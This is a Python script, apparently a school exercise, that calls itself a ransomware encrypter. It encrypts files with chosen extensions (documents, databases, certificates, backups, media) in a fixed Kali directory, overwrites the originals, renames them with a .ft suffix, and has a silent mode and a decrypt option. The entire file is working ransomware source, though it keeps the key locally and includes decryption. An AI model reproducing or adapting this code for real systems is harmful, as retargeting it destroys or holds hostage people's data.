#!/usr/bin/env python3

import sys
from cryptography.fernet import Fernet
import os
from colorama import Fore, Back, Style

def	get_files():
	files = []
	no_encrypt = []
	directorys = []
	encrypt_path = '/home/kali/infection'
	ext_to_encrypt = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
	'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
	,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
	,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
	,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
	,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
	,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
	,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
	,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
	,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
	,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
	,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']
	if os.path.exists(encrypt_path) == False:
		os.mkdir(encrypt_path)
		if len(sys.argv) == 1:
			print(Back.RED, Fore.YELLOW, "🦠 The directory 'infection' doesn't exist, so it has been created empty. If you want to encrypt files, you will have to fill it in.", Style.RESET_ALL)
		exit()
	if os.path.isfile(encrypt_path):
		print(Fore. YELLOW, "Cannot create a 'infection' directory, there is a file with the same name.", Style.RESET_ALL)
		exit()
	try:
		for file in os.listdir(encrypt_path):
			if file == "stockholm.py":
				continue
			filename, file_extension = os.path.splitext(encrypt_path + '/' + file)
			if os.path.isfile(encrypt_path + '/' + file):
				if file_extension in ext_to_encrypt:
					files.append(encrypt_path + '/' + file)
			elif os.path.isfile(encrypt_path + '/' + file):
				no_encrypt.append(encrypt_path + '/' + file)
			else:
				directorys.append(encrypt_path + '/' + file)
	except:
		print(Fore.YELLOW, "You dont have permissions on the directory:", encrypt_path, Style.RESET_ALL)
		exit()
	if len(sys.argv) == 1 and len(no_encrypt) > 0:
		print(Back.RED, Fore.YELLOW, "📄 Files that cannot be encrypt because of the extension:", Style.RESET_ALL)
		print(Fore.RED, *no_encrypt, Style.RESET_ALL, sep='\n')
	if len(sys.argv) == 1 and len(directorys) > 0:
		print(Back.RED, Fore.YELLOW, "📂 Directorys cannot be encrypt:", Style.RESET_ALL)
		print(Fore.RED, *directorys, Style.RESET_ALL, sep='\n')
	return(files)

def	create_key():

	if os.path.isdir('key.key'):
		print(Fore.YELLOW, "There is a directory named 'key.key', you'll have to delete or rename the directory to be able to create the key.", Style.RESET_ALL)
		exit()
	if os.path.isfile('key.key'):
		print(Fore.YELLOW, "The file 'key.key' already exists, if you want to encrypt make sure you decrypted the files or remove the file 'key.key'.", Style.RESET_ALL)
		exit()
	key = Fernet.generate_key()
	with open('key.key', 'wb') as key_file:
		key_file.write(key)
	return(key)

def	encrypt(files, key):
	count = len(files)
	encrypters = []
	for item in files:
		try:
			with open(item, 'rb') as file:
				file_data = file.read()
			encrypted_data = Fernet(key).encrypt(file_data)
			with open(item, 'wb') as file:
				file.write(encrypted_data)
			os.rename(item, item + ".ft")
			encrypters.append(item)
		except:
			count -= 1
			if len(sys.argv) == 1:
				print(Fore.YELLOW, "You dont have permisions of the file:", item, Style.RESET_ALL, sep='\n')
	if count == 0:
		print(Fore.RED, "\nANY FILE CAN BE ENCRYPTED", Style.RESET_ALL)
		os.remove('key.key')
		exit()
	return(encrypters)


def desencrypt():

	desencrypt_path = '/home/kali/infection'
	desencrypt_files = []
	if os.path.exists(desencrypt_path) == False:
		print(Fore.YELLOW, "🤔 The path to decrypt doesn't exist... Did you remove the directory?", Style.RESET_ALL)
		return
	for file in os.listdir(desencrypt_path):
		filename, file_extension = os.path.splitext(desencrypt_path + '/' + file)
		if file_extension == ".ft":
			desencrypt_files.append(desencrypt_path + '/' + file)
	if len(desencrypt_files) == 0:
		print(Fore.YELLOW, "😵 There is no files to decrypt... Did you remove the files?", Style.RESET_ALL)
		return
	try:
		with open('key.key', 'r') as keey:
			secret_key = keey.read()
	except:
		print(Fore.YELLOW, "The file 'key.key' not found.", Style.RESET_ALL)
		exit()
	if secret_key == sys.argv[2]:
		for item in desencrypt_files:
			with open(item, 'rb') as thefile:
				content = thefile.read()
			try:
				content_decrypted = Fernet(secret_key).decrypt(content)
				with open(item, 'wb') as thefile:
					thefile.write(content_decrypted)
				filename, file_extension = os.path.splitext(item)
				os.rename(item, filename)
			except:
				continue
		os.remove('key.key')
		print(Fore.BLACK, Back.GREEN, "✅ Files decrypted succesfully.", Style.RESET_ALL)
	else: print(Back.RED, Fore.YELLOW, "❌ Wrong key.", Style.RESET_ALL)

def	check_argvs():

	if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "-help"):
		print("Usage of the ransomware encrypter:\n\npython3 stockholm.py    python3 stockholm.py [OPTION]    python3 stockholm.py [OPTION] [KEY]\n")
		print("  Different options:")
		print("    -h, -help		shows the helper of the program")
		print("    -r, -reverse	desencrypt the files, putting the [KEY] after the flag")
		print("    -s, -silent		doesn't show the files encrypted when execute the ransomware")
		print("    -v, -version	displays the version of the program")
	elif len(sys.argv) == 2 and (sys.argv[1] == "-v" or sys.argv[1] == "-version"):
		print("The actual version of this program is 1.0v made by iamoros-")
	elif len(sys.argv) == 2 and (sys.argv[1] == "-s" or sys.argv[1] == "-silent"):
		return
	elif len(sys.argv) == 2 and (sys.argv[1] == "-r" or sys.argv[1] == "-reverse"):
		print(Fore.YELLOW, "You forgot to put the key, try again...", Style.RESET_ALL)
	elif len(sys.argv) == 3 and (sys.argv[1] == "-r" or sys.argv[1] == "-reverse"):
		desencrypt()
	else :
		print(Fore.YELLOW, "Wrong parameters input. Use the flag -h or -help to know the usage.", Style.RESET_ALL)


def	ransomware():

	if len(sys.argv) > 3:
		print(Fore.YELLOW, "Too many arguments...", Style.RESET_ALL)
		exit()
	if len(sys.argv) == 1 or sys.argv[1] == "-s" or sys.argv[1] == "-silent":
		if len(sys.argv) > 2:
			print(Fore.YELLOW, "Wrong parameters input. Use the flag -h or -help to know the usage.", Style.RESET_ALL)
			return
		files = get_files()
		if len(sys.argv) == 1:
			if len(files) > 0:
				print(Fore.BLACK, Back.GREEN, "🔐 Files to encrypt:", Style.RESET_ALL)
				print(Fore.GREEN, *files, Style.RESET_ALL, sep='\n')
			else:
				print(Fore.YELLOW, 'There is no files to encrypt.', Style.RESET_ALL)
				return
		if len(files) == 0:
			return
		key = create_key()
		files = encrypt(files, key)
		if len(sys.argv) == 1:
			print(Fore.BLACK, Back.GREEN, "⛓ 3NCRYPT10N C0MPL3T3D⛓", Style.RESET_ALL)
			print(Fore.GREEN, *files, Style.RESET_ALL, sep='\n')
	if len(sys.argv) != 1:
		check_argvs()

if __name__ == '__main__':

	ransomware()